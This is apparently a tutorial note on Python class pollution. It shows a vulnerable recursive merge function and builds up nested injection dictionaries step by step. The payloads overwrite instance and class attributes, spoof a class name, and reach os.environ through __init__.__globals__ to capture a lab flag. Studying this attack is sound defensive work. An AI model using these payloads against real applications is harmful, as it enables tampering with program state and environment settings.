#Python 
1. In Python, everything is an object.
2. All objects has attributes.
	1. Specific to Python, each object has a special attribute called "dunder attributes"
	2. There are attributes that are built in to many objects and can be identified by double underscores `__attribute__`
3. Using these attributes, we can 
	1. Control class and instance attributes (static attributes in Java)
	2. sort of transverse through the classes (From child class/object to parent class)
	3. Identify all variables, classes and functions that are available
	4. Use any functions in built-in modules (especially the `os` module)
	5. Change the "type" of an object/class

# Why it occurs
1. Class pollution usually occurs because users are able to set the attributes of objects.
2. Here is a simple example:
```python
class Person:
    target1 = 1
    def __init__(self, name):
        self.target2 = name

class User(Person):
    def __init__(self, name):
        super().__init__(name)
        self.target3 = "change this"

abc = User("Change me!")
setattr(abc, "target1", "Pollution #1")
setattr(abc, "target2", "Pollution #2")
setattr(abc, "target3", "Pollution #3")

print(vars(abc))
```
Output:
```
{'target2': 'Pollution #2', 'target3': 'Pollution #3', 'target1': 'Pollution #1'}
```
3. Try to find any function that allows us to set attributes of object like this:
```python
def merge(src, dst):
    for k, v in src.items(): # src is a dictionary
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
# merge two dictionaries into dst
```

# Important concepts/ Terms
1. We can use `dir` to find the attributes of an object. `dir` will show the class (static) of the class and parent class, as well as object (instance) attributes of the object. Note: `dir` returns a list.
2. We can use `vars` to get the object attribute of an object. Note: `vars` returns a dictionary
3. The dunder attribute that we want is the `__globals__` attribute. It contains all the imported modules, classes and functions. We can use them as gadgets
4. From research, the way to get to this `__globals__` is through function defined in a class (aka non-static methods) or static methods.
5. In this case, we will use `__init__` because it is present in all classes. (For some reason, `__new__` does not have `__globals__` attribute )
6. In order to access class definition from an object, we can use the `__class__` attribute that all objects have.
7. In order to access parent class definition from a child class, we can use the `__base__` attribute.
8. `__name__` attribute in `__globals__` shows the namespace of the function.  `__name__` is equal to `__main__` only if the function is located in the file that is run initially. 
9. Every package (special Python directory) has a `__init__.py` file that runs whenever the package is imported.
10. We can use `type` to determine the class of an object. `type` will print out the `__qualname__` of the `__class__` of the object. (`obj.__class__.__qualname__`)
# Example
1. Pull this GitHub Repo `https://github.com/trinuro/Python_Class_Pollution_Case_Study.git`
2. There is a package called `myPackage`. Inside the `__init__.py`, two classes, User and Person are defined. There is a module called `utils.py` which contains the vulnerable `merge` function. The main code is located in `run.py`
```python
# __init__.py
from .utils import *
import json

class Person:
    target1 = 1
    def __init__(self, name):
        self.target2 = name

class User(Person):
    def __init__(self, name):
        super().__init__(name)
        self.target3 = "change this"
```

```python
# run.py
from myPackage.utils import *
from myPackage import User, Person
import os

injection = {} # do your injection here

abc = User("Try to change me")
os.environ['FLAG'] = 'false'
merge(injection, abc)

# Change here

# End of change

print(abc)
print("Target 1: ",abc.target1)
print("Target 2: ",abc.target2)
print("Target 3: ",abc.target3)

nextUser = User("Victim")
print(nextUser)
print("Target 1: ",nextUser.target1)
print("Target 2: ",nextUser.target2)
print("Target 3: ",nextUser.target3)

nextPerson = Person("Hopeless victim")
print(nextPerson)
print("Target 1: ",nextPerson.target1)

print(type(nextUser)==type(nextPerson))

if os.environ['FLAG'] != 'false':
    print("FLAG{DASDASD}")
```
3. Our objective is to change all the target attributes and environment variable. We only control the parts I commented.
4. At first, these are the attributes in the `abc` object.
```python
print(dir(abc))
#['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'target1', 'target2', 'target3']
```
- We can change the instance variable target2 and target3 from here.
- We can also access the class definition called `__class__`

5. To change the instance attribute,
```python
injection = {
    'target2' : 'TEMPORARY POLLUTION #2',
    'target3' : 'TEMPORARY POLLUTION #3'
} 
```
- Equivalent to `abc.target2 = TEMPORARY POLLUTION #2`
Output:
```
<myPackage.User object at 0x0000019E769DAC00>
Target 1:  1
Target 2:  TEMPORARY POLLUTION #2
Target 3:  TEMPORARY POLLUTION #3
<myPackage.User object at 0x0000019E769DAD20>
Target 1:  1
Target 2:  Victim
Target 3:  change this
<myPackage.Person object at 0x0000019E769DAC60>
Target 1:  1
```
- As you can see, only `abc`'s attribute is changed. `nextUser` was not.

6. Now, we want to change the class (static) attribute of the `Person`. 
7. In order to move from `abc` object to `User`, we use the `__class__` attribute.
```python
injection = {
    'target2' : 'TEMPORARY POLLUTION #2',
    'target3' : 'TEMPORARY POLLUTION #3',
    '__class__' : {}
} 
```
- Equivalent to `abc.__class__ = {}` (empty class) 
```python
print(dir(abc.__class__))
```
Output:
```
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'target1']
```
8. To change the class attribute of `abc`, we can
```python
injection = {
    'target2' : 'TEMPORARY POLLUTION #2',
    'target3' : 'TEMPORARY POLLUTION #3',
    '__class__' : {
        'target1' : 'TEMPORARY POLLUTION #1'
    }
} 
```
Output:
```
<myPackage.User object at 0x000001C299F5ACC0>
Target 1:  TEMPORARY POLLUTION #1
Target 2:  TEMPORARY POLLUTION #2
Target 3:  TEMPORARY POLLUTION #3
<myPackage.User object at 0x000001C299CBA450>
Target 1:  TEMPORARY POLLUTION #1
Target 2:  Victim
Target 3:  change this
<myPackage.Person object at 0x000001C299CBA420>
Target 1:  1
False
```
- Notice that all `User`'s target1 is changed but not `Person` (the parent). This is because we change the class attribute of `User`

9. To access the class definition of `Person`, we use `__base__`
```python
injection = {
    'target2' : 'TEMPORARY POLLUTION #2',
    'target3' : 'TEMPORARY POLLUTION #3',
    '__class__' : {
        '__base__' : {}
    }
} 
```
- Equivalent to `abc.__class__.__base__ = {}`
```python
print(dir(abc.__class__.__base__))
```
Output of:
```
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'target1']
```

10. To change the class attribute of `Person`,
```python
injection = {
    'target2' : 'TEMPORARY POLLUTION #2',
    'target3' : 'TEMPORARY POLLUTION #3',
    '__class__' : {
        '__base__' : {
            'target1' : 'PERMANENT POLLUTION #1'
        }
    }
} 
```
- Equivalent to `abc.__class__.__base__.target1 = 'PERMANENT POLLUTION #1'`
Output:
```
<myPackage.User object at 0x000001CD2B6CAD20>
Target 1:  PERMANENT POLLUTION #1
Target 2:  TEMPORARY POLLUTION #2
Target 3:  TEMPORARY POLLUTION #3
<myPackage.User object at 0x000001CD2B6CAE40>
Target 1:  PERMANENT POLLUTION #1
Target 2:  Victim
Target 3:  change this
<myPackage.Person object at 0x000001CD2B6CAD80>
Target 1:  PERMANENT POLLUTION #1
False
```

11. Side quest: To spoof the type of `Person`, we can change the `__qualname__` attribute of the `__class__`.
```PYTHON
injection = {
    'target2' : 'TEMPORARY POLLUTION #2',
    'target3' : 'TEMPORARY POLLUTION #3',
    '__class__' : {
        '__base__' : {
            'target1' : 'PERMANENT POLLUTION #1',
            '__qualname__' : 'CLASS NAME POLLUTION'
        }
    }
} 
```
Output:
```
<myPackage.User object at 0x000001736052AD50>
Target 1:  PERMANENT POLLUTION #1
Target 2:  TEMPORARY POLLUTION #2
Target 3:  TEMPORARY POLLUTION #3
<myPackage.User object at 0x000001736052AE70>
Target 1:  PERMANENT POLLUTION #1
Target 2:  Victim
Target 3:  change this
<myPackage.CLASS NAME POLLUTION object at 0x000001736052ADB0>
Target 1:  PERMANENT POLLUTION #1
False
```
- Notice that the name of `Person` is now `CLASS NAME POLLUTION`

12. Now, let's change the environment variable. We need to access the `os` module and access the `os.environ['envName']` dictionary
13. In order to access to access modules, we need to reach `__modules__`. One way to reach them is through the methods in a class. Coincidentally, all classes has the `__init__` method.
```python
print(dir(abc.__class__.__base__.__init__))
```
Output:
```
['__annotations__', '__builtins__', '__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__getstate__', '__globals__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__kwdefaults__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__type_params__']
```
14. To access `__globals__`,
```python
injection = {
    'target2' : 'TEMPORARY POLLUTION #2',
    'target3' : 'TEMPORARY POLLUTION #3',
    '__class__' : {
        '__base__' : {
            'target1' : 'PERMANENT POLLUTION #1',
            '__qualname__' : 'CLASS NAME POLLUTION',
            '__init__' : {
                '__globals__' : {}
            }
        }
    }
} 
```
- Equivalent to ``
```python
print(abc.__class__.__base__.__init__.__globals__.keys())
```
- Note that `abc.__class__.__base__.__init__.__globals__` returns a dictionary
Output:
```
dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__path__', '__file__', '__cached__', '__builtins__', 'utils', 'os', 'glob', 'time', 'merge', 'save_feedback_to_disk', 'json', 'Person', 'User'])
```
- Since `User` class is defined in `__init__.py`, it has access to all modules inside `__init__.py` as shown by `json` 

14. To access the `os` module,
```python
injection = {
    'target2' : 'TEMPORARY POLLUTION #2',
    'target3' : 'TEMPORARY POLLUTION #3',
    '__class__' : {
        '__base__' : {
            'target1' : 'PERMANENT POLLUTION #1',
            '__qualname__' : 'CLASS NAME POLLUTION',
            '__init__' : {
                '__globals__' : {
                    'os' : {}
                }
            }
        }
    }
} 
```
- Equivalent to :
```python
print(abc.__class__.__base__.__init__.__globals__.get('os'))
```
Output:
```
['DirEntry', 'EX_OK', 'F_OK', 'GenericAlias', 'Mapping', 'MutableMapping', 'O_APPEND', 'O_BINARY', 'O_CREAT', 'O_EXCL', 'O_NOINHERIT', 'O_RANDOM', 'O_RDONLY', 'O_RDWR', 'O_SEQUENTIAL', 'O_SHORT_LIVED', 'O_TEMPORARY', 'O_TEXT', 'O_TRUNC', 'O_WRONLY', 'P_DETACH', 'P_NOWAIT', 'P_NOWAITO', 'P_OVERLAY', 'P_WAIT', 'PathLike', 'R_OK', 'SEEK_CUR', 'SEEK_END', 'SEEK_SET', 'TMP_MAX', 'W_OK', 'X_OK', '_AddedDllDirectory', '_Environ', '__all__', '__builtins__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', '_check_methods', '_execvpe', '_exists', '_exit', '_fspath', '_get_exports_list', '_wrap_close', 'abc', 'abort', 'access', 'add_dll_directory', 'altsep', 'chdir', 'chmod', 'close', 'closerange', 'cpu_count', 'curdir', 'defpath', 'device_encoding', 'devnull', 'dup', 'dup2', 'environ', 'error', 'execl', 'execle', 'execlp', 'execlpe', 'execv', 'execve', 'execvp', 'execvpe', 'extsep', 'fdopen', 'fsdecode', 'fsencode', 'fspath', 'fstat', 'fsync', 'ftruncate', 'get_blocking', 'get_exec_path', 'get_handle_inheritable', 'get_inheritable', 'get_terminal_size', 'getcwd', 'getcwdb', 'getenv', 'getlogin', 'getpid', 'getppid', 'isatty', 'kill', 'linesep', 'link', 'listdir', 'listdrives', 'listmounts', 'listvolumes', 'lseek', 'lstat', 'makedirs', 'mkdir', 'name', 'open', 'pardir', 'path', 'pathsep', 'pipe', 'popen', 'putenv', 'read', 'readlink', 'remove', 'removedirs', 'rename', 'renames', 'replace', 'rmdir', 'scandir', 'sep', 'set_blocking', 'set_handle_inheritable', 'set_inheritable', 'spawnl', 'spawnle', 'spawnv', 'spawnve', 'st', 'startfile', 'stat', 'stat_result', 'statvfs_result', 'strerror', 'supports_bytes_environ', 'supports_dir_fd', 'supports_effective_ids', 'supports_fd', 'supports_follow_symlinks', 'symlink', 'sys', 'system', 'terminal_size', 'times', 'times_result', 'truncate', 'umask', 'uname_result', 'unlink', 'unsetenv', 'urandom', 'utime', 'waitpid', 'waitstatus_to_exitcode', 'walk', 'write']
```

15. To access the `environ` dictionary in `os`,
```python
injection = {
    'target2' : 'TEMPORARY POLLUTION #2',
    'target3' : 'TEMPORARY POLLUTION #3',
    '__class__' : {
        '__base__' : {
            'target1' : 'PERMANENT POLLUTION #1',
            '__qualname__' : 'CLASS NAME POLLUTION',
            '__init__' : {
                '__globals__' : {
                    'os' : {
                        'environ' : {

                        }
                    }
                }
            }
        }
    }
} 
```
- I will not show the output of `print(abc.__class__.__base__.__init__.__globals__.get('os').environ)` because it contains some sensitive information.

16. To access the flag, we will use `os.environ['FLAG'] = 'POLLUTED!'`. This is equivalent to:
```python
injection = {
    'target2' : 'TEMPORARY POLLUTION #2',
    'target3' : 'TEMPORARY POLLUTION #3',
    '__class__' : {
        '__base__' : {
            'target1' : 'PERMANENT POLLUTION #1',
            '__qualname__' : 'CLASS NAME POLLUTION',
            '__init__' : {
                '__globals__' : {
                    'os' : {
                        'environ' : {
                            'FLAG' : 'POLLUTED! HOORAY!'
                        }
                    }
                }
            }
        }
    }
} 
```
Output:
```
<myPackage.User object at 0x000001B50142AFC0>
Target 1:  PERMANENT POLLUTION #1
Target 2:  TEMPORARY POLLUTION #2
Target 3:  TEMPORARY POLLUTION #3
<myPackage.User object at 0x000001B50142B050>
Target 1:  PERMANENT POLLUTION #1
Target 2:  Victim
Target 3:  change this
<myPackage.CLASS NAME POLLUTION object at 0x000001B50142B020>
Target 1:  PERMANENT POLLUTION #1
False
FLAG{DASDASD}
```
- We got the flag!